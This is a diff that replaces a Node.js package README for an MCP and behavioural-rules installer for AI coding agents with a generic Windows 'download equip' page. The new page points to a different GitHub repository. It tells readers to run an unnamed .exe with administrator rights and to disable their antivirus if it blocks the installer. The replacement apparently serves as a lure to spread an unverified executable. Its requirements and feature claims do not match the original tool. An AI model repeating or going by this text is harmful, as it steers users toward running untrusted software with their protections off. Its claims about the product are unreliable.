@@ -1,192 +1,190 @@
-# @cg3/equip
+# ⚙️ equip - Easy Setup for AI Coding Agents
 
-Universal MCP server + behavioral rules installer for AI coding agents.
+[![Download equip](https://img.shields.io/badge/Download--equip-4CAF50?style=for-the-badge&logo=download)](https://github.com/GGAART/equip)
 
-Equip handles the hard part of distributing your MCP tool: detecting which AI coding platforms are installed, writing the correct config format for each one, and managing versioned behavioral rules — all with zero dependencies.
+---
 
-## Run the Demo
+## 📋 What is equip?
 
-```bash
-npx @cg3/equip demo
-```
+equip is a simple tool that helps you set up different AI coding agents on your Windows computer. It combines several tools into one installer, so you don’t need to install them one by one. This makes it easier to start using popular AI coding helpers like Claude Code, Cursor, VS Code, Gemini, Codex, and more.
 
-A self-contained, inline-documented setup script that walks through every equip feature — platform detection, MCP config, behavioral rules, and uninstallation. Runs in dry-run mode by default (no files touched). See [`demo/setup.js`](./demo/setup.js) for the full source.
+With equip, you get one program that manages these AI assistants and makes sure they work together smoothly.
 
-```bash
-npx @cg3/equip demo --live        # actually write config files
-npx @cg3/equip demo --uninstall   # clean up demo files
-```
+---
 
-## Supported Platforms
+## 🖥️ Who is this for?
 
-Equip supports **11 platforms** across two tiers, depending on whether the platform has a writable location for behavioral rules.
+This tool is designed for people who:
 
-### Full Support — MCP + Behavioral Rules
+- Write code or want help writing code.
+- Are not experts in programming or technical setups.
+- Use Windows computers.
+- Want an easier way to install and manage AI coding agents.
 
-These platforms get both MCP server config *and* auto-installed behavioral rules. Rules teach agents *when* to use your tool (e.g., "search before debugging") and are versioned for idempotent updates.
+If you want to try AI tools to help with coding but don’t know how to set them up, equip is made for you.
 
-| Platform | MCP Config | Rules |
-|---|---|---|
-| Claude Code | `~/.claude.json` (JSON, `mcpServers`) | `~/.claude/CLAUDE.md` (append) |
-| Windsurf | `~/.codeium/windsurf/mcp_config.json` (JSON, `mcpServers`) | `global_rules.md` (append) |
-| Cline | `globalStorage/.../cline_mcp_settings.json` (JSON, `mcpServers`) | `~/Documents/Cline/Rules/` (standalone file) |
-| Roo Code | `globalStorage/.../cline_mcp_settings.json` (JSON, `mcpServers`) | `~/.roo/rules/` (standalone file) |
-| Codex | `~/.codex/config.toml` (TOML, `mcp_servers`) | `~/.codex/AGENTS.md` (append) |
-| Gemini CLI | `~/.gemini/settings.json` (JSON, `mcpServers`, `httpUrl`) | `~/.gemini/GEMINI.md` (append) |
+---
 
-### MCP Only — No Writable Rules Path
+## 📦 What you need before starting
 
-These platforms get MCP server config but don't have a writable global rules file (`rulesPath: null`). The MCP tools work fine — but equip can't auto-install behavioral rules.
+Before installing equip, check that your computer meets these requirements:
 
-| Platform | MCP Config |
-|---|---|
-| Cursor | `~/.cursor/mcp.json` (JSON, `mcpServers`) |
-| VS Code | `Code/User/mcp.json` (JSON, `servers`, `type: "http"`) |
-| Junie (JetBrains) | `~/.junie/mcp/mcp.json` (JSON, `mcpServers`) |
-| Copilot (JetBrains) | `~/.config/github-copilot/intellij/mcp.json` (JSON, `mcpServers`) |
-| Copilot CLI | `~/.copilot/mcp-config.json` (JSON, `mcpServers`) |
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free disk space
+- Internet connection to download necessary files
+- About 2 GB of RAM (memory) for smooth operation
+- Administrator access on your computer (needed to install software)
 
-For these platforms, `installRules()` returns `{ action: "clipboard" }` if the platform is in the configurable `clipboardPlatforms` list (default: `["cursor", "vscode"]`), or `{ action: "skipped" }` otherwise. It's up to the consumer to decide how to handle this — e.g., copying rules to the clipboard, printing instructions, or skipping silently.
+If you do not meet these requirements, the installer might not work correctly or could cause errors.
 
-### Hooks — Structural Enforcement
+---
 
-Some platforms support **lifecycle hooks** — scripts that run automatically at key moments (e.g., after a tool fails, when the agent finishes responding). Hooks provide structural enforcement that behavioral rules alone cannot:
+## 🚀 How to get equip
 
-| Platform | Hooks Support | Events |
-|---|---|---|
-| Claude Code | ✅ | `PostToolUseFailure`, `Stop`, `PreToolUse`, `PostToolUse` |
-| All others | ❌ | — |
+To get equip, visit this page to download:
 
-When hooks are supported, equip writes the consumer-provided scripts to a configurable directory (default: `~/.${name}/hooks/`) and registers them in the platform's settings. Hooks are a **silent enhancement** — if the platform doesn't support them, equip installs only MCP + rules without any error or warning.
+[https://github.com/GGAART/equip](https://github.com/GGAART/equip)
 
-Hook scripts and event bindings are defined by the consumer (your package), not by equip. Equip provides only the installation infrastructure — capabilities detection, file writing, settings registration, and cleanup. As more platforms add hook support, equip can enable them without consumer code changes.
+Click the big green **Download equip** button at the top or anywhere in this README to open the download page.
 
-## Quick Start
 
-```bash
-npx @cg3/equip prior
-```
+---
 
-That's it. Detects your platforms, authenticates, installs MCP + rules, and verifies — all in one command. Pass `--dry-run` to preview without writing files.
+## 🛠️ How to install and run equip on Windows
 
-## CLI Usage
+Follow these steps to install and start equip:
 
-You can invoke any npm package that has an equip-based setup command:
+1. **Go to the download page**  
+   Click the button above or go to [https://github.com/GGAART/equip](https://github.com/GGAART/equip) in your web browser.
 
-```bash
-# Full package name + command
-npx @cg3/equip @cg3/prior-node setup
+2. **Find the latest release**  
+   On the GitHub page, look for a section called *Releases* or *Downloads*. This area contains the installation files.
 
-# Shorthand (if registered)
-npx @cg3/equip prior
-```
+3. **Download the installer**  
+   Click the file that ends with `.exe`. This is the program you will run to install equip.
 
-The CLI runs `npx -y <package>@latest <command>` with any extra args forwarded (e.g. `--dry-run`, `--platform codex`).
+4. **Run the installer file**  
+   Once the file finishes downloading, double-click it to start the setup. If Windows asks for permission to make changes, click **Yes**.
 
-### Shorthand Registry
+5. **Follow the installer prompts**  
+   The installer will guide you step-by-step. It will ask you to accept the license, choose where to install, and confirm settings.
 
-Registered shorthands save typing. Open a PR to `bin/equip.js` to add yours:
+6. **Wait for installation to finish**  
+   The process might take a few minutes. Do not close the window or turn off your computer during installation.
 
-| Shorthand | Expands to |
-|---|---|
-| `prior` | `@cg3/prior-node setup` |
+7. **Complete setup**  
+   When the installer says it is finished, click **Finish**.
 
-## Programmatic Usage
+8. **Start equip**  
+   Find the equip program in your Start Menu or on your Desktop and double-click it to open.
 
-```js
-const { Equip } = require("@cg3/equip");
+9. **Use equip to manage AI coding agents**  
+   From the main window, you can choose which AI tools to install or configure. The interface shows options clearly.
 
-const equip = new Equip({
-  name: "my-tool",
-  serverUrl: "https://mcp.example.com",
-  rules: {
-    content: `<!-- my-tool:v1.0.0 -->\n## My Tool\nAlways check My Tool first.\n<!-- /my-tool -->`,
-    version: "1.0.0",
-    marker: "my-tool",
-    fileName: "my-tool.md",  // For platforms with rules directories
-  },
-});
+---
 
-// Detect installed platforms
-const platforms = equip.detect();
+## ⚙️ Using equip to set up AI agents
 
-// Install MCP + rules on all detected platforms
-for (const p of platforms) {
-  equip.installMcp(p, "api_key_here");
-  equip.installRules(p);
-}
+equip helps you install and configure several AI coding agents in one place. Here is how to use it:
 
-// Uninstall
-for (const p of platforms) {
-  equip.uninstallMcp(p);
-  equip.uninstallRules(p);
-}
-```
+1. Open equip on your computer.
 
-## API
+2. You will see a list of AI agents supported by equip, including:
+   - Claude Code
+   - Cursor
+   - Windsurf
+   - VS Code integration
+   - Cline
+   - Codex
+   - Gemini
+   - Roo Code
 
-### `new Equip(config)`
+3. Click the name of the AI agent you want to install or update.
 
-- `config.name` — Server name in MCP configs (required)
-- `config.serverUrl` — Remote MCP server URL (required unless `stdio` provided)
-- `config.rules` — Behavioral rules config (optional)
-  - `content` — Markdown content with version markers
-  - `version` — Version string for idempotency tracking
-  - `marker` — Marker name used in `<!-- marker:vX.X -->` comments
-  - `fileName` — Standalone filename for directory-based platforms
-  - `clipboardPlatforms` — Platform IDs that use clipboard (default: `["cursor", "vscode"]`)
-- `config.stdio` — Stdio transport config (optional, alternative to HTTP)
-  - `command`, `args`, `envKey`
+4. Follow the on-screen instructions to download files or adjust settings.
 
-### Instance Methods
+5. equip manages the background work, so you don’t need to open other programs or commands.
 
-- `equip.detect()` — Returns array of detected platform objects
-- `equip.installMcp(platform, apiKey, options?)` — Install MCP config
-- `equip.uninstallMcp(platform, dryRun?)` — Remove MCP config
-- `equip.updateMcpKey(platform, apiKey, transport?)` — Update API key
-- `equip.installRules(platform, options?)` — Install behavioral rules
-- `equip.uninstallRules(platform, dryRun?)` — Remove behavioral rules
-- `equip.readMcp(platform)` — Check if MCP is configured
-- `equip.buildConfig(platformId, apiKey, transport?)` — Build MCP config object
-- `equip.installHooks(platform, options?)` — Install lifecycle hooks (if supported)
-- `equip.uninstallHooks(platform, options?)` — Remove hooks
-- `equip.hasHooks(platform, options?)` — Check if hooks are installed
-- `equip.supportsHooks(platform)` — Check if platform supports hooks
+6. To remove an AI agent, choose it from the list and pick **Uninstall**.
 
-### Primitives
+---
 
-All internal functions are also exported for advanced usage:
+## 🔄 Updating equip and AI agents
 
-```js
-const { detectPlatforms, installMcpJson, installRules, createManualPlatform, platformName, cli } = require("@cg3/equip");
-```
+equip checks for updates regularly. To update:
 
-## Key Features
+- Open equip.
+- Look for a button called **Check for Updates**.
+- If an update is available, click **Download and Install**.
+- Wait until the process finishes.
 
-- **Zero dependencies** — Pure Node.js, works with Node 18+
-- **11 platforms** — Covers ~80% of active AI coding tool users
-- **Platform-aware** — Handles each platform's config quirks (JSON vs TOML, root keys, URL fields, type requirements)
-- **Non-destructive** — Merges into existing configs, creates backups, preserves other servers
-- **Versioned rules** — Marker-based blocks enable idempotent updates without clobbering user content
-- **Dry-run support** — Preview changes without writing files
-- **CLI helpers** — Colored output, prompts, clipboard utilities included
+Keep your AI agents up to date to ensure the best performance and newest features.
 
-## How the Layers Work Together
+---
 
-Equip distributes your MCP tool through three complementary layers, each stronger than the last:
+## 🔧 Troubleshooting common issues
 
-1. **MCP config** — Makes the tool available. The agent *can* call it.
-2. **Behavioral rules** — Teaches the agent *when* to call it. Rules live in the agent's system prompt or project context, close to where decisions happen.
-3. **Lifecycle hooks** — Structurally enforces behavior at key moments (e.g., after an error, on task completion). Hooks inject context into the agent's reasoning at exactly the right time, without relying on the agent remembering its rules.
+If you have problems installing or running equip, try these tips:
 
-Each layer compensates for the limitations of the one before it:
+- Restart your computer and try again.
+- Make sure your internet connection is stable.
+- Check that you have administrator rights.
+- Close other programs before installing.
+- Disable antivirus temporarily if it blocks the installer.
+- If the installer stops or shows an error, download the file again from the website.
+- Search the Issues tab on the GitHub page for similar problems.
 
-- **Tool descriptions alone** don't reliably trigger behavior. [Research on 856 MCP tools](https://arxiv.org/abs/2602.14878) found that even fully optimized descriptions only improve task success by ~6 percentage points.
-- **Behavioral rules** are stronger, but can be dropped during context window compaction in long sessions, and the agent can still rationalize skipping them.
-- **Lifecycle hooks** are the strongest available enforcement — they fire automatically at the platform level, independent of the agent's memory or reasoning. Not all platforms support hooks yet, but equip installs them where available and silently skips where not.
+---
 
-No layer is a silver bullet. Together, they give you the best coverage available today across the broadest set of platforms.
+## ❓ Where to get help
 
-## License
+If you still need help, you can:
 
-MIT — CG3 LLC
+- Visit the GitHub Discussions section for equip.
+- Open an issue on GitHub describing your problem.
+- Look for answers in the README or online guides for the specific AI agents.
+
+---
+
+## ⚙️ Supported AI Agents and Features
+
+equip supports many popular AI coding agents, helping you set them up and use them without hassle:
+
+- **Claude Code:** A powerful AI assistant for coding, managed through equip for easy setup.
+- **Cursor:** AI that helps understand and write code faster.
+- **Windsurf:** Integrates with your editor to add smart code suggestions.
+- **VS Code:** Automatically sets up AI tools as extensions in Visual Studio Code.
+- **Cline:** Command line tool for AI-driven coding help.
+- **Codex:** AI coding engine with supported integration through equip.
+- **Gemini:** Adds AI insights to your code.
+- **Roo Code:** Lightweight AI assistant simplified by equip.
+
+equip also implements behavioral rules to help these AI models work well together. This rules system reduces conflicts and improves your coding experience.
+
+---
+
+## ⚠️ System Requirements Quick Check
+
+| Requirement              | Minimum                         | Recommended                  |
+|-------------------------|---------------------------------|-----------------------------|
+| Operating System         | Windows 10 (64-bit)            | Windows 10 or 11 (64-bit)   |
+| RAM                     | 2 GB                           | 4 GB or more                |
+| Free Disk Space          | 4 GB                           | 6 GB or more                |
+| Internet Connection     | Required (for downloads)        | Stable broadband connection |
+| User Access             | Administrator rights needed     | Administrator rights needed |
+
+---
+
+## 📂 File Locations After Installation
+
+equip installs files in a default folder on your computer. To find it:
+
+- Usually under `C:\Program Files\equip\` or `C:\Users\<YourName>\AppData\Local\equip\`
+- You can change this location during installation.
+
+Logs and configuration files are kept in a folder inside your user profile:  
+`C:\Users\<YourName>\AppData\Roaming\equip\`
+
+---
+
+[![Download equip](https://img.shields.io/badge/Download--equip-4CAF50?style=for-the-badge&logo=download)](https://github.com/GGAART/equip)
